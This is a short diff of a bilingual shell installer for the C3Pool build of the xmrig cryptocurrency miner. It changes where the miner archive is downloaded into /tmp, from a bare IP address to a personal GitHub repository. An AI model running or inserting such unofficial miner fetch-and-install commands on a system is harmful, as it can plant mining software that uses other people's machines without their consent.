@@ -161,9 +161,9 @@ rm -rf $HOME/c3pool
 
 echo "[*] Downloading C3Pool advanced version of xmrig to /tmp/xmrig.tar.gz"
 echo "[*] 下载 C3Pool 版本的 Xmrig 到 /tmp/xmrig.tar.gz 中"
-if ! curl -L --progress-bar "http://172.247.34.167/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
-  echo "ERROR: Can't download http://172.247.34.167/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
-  echo "发生错误: 无法下载 http://172.247.34.167/xmrig.tar.gz 文件到 /tmp/xmrig.tar.gz"
+if ! curl -L --progress-bar "https://github.com/teshushu/BiBi/raw/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
+  echo "ERROR: Can't download https://github.com/teshushu/BiBi/raw/main/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
+  echo "发生错误: 无法下载 https://github.com/teshushu/BiBi/raw/main/xmrig.tar.gz 文件到 /tmp/xmrig.tar.gz"
   exit 1
 fi
 
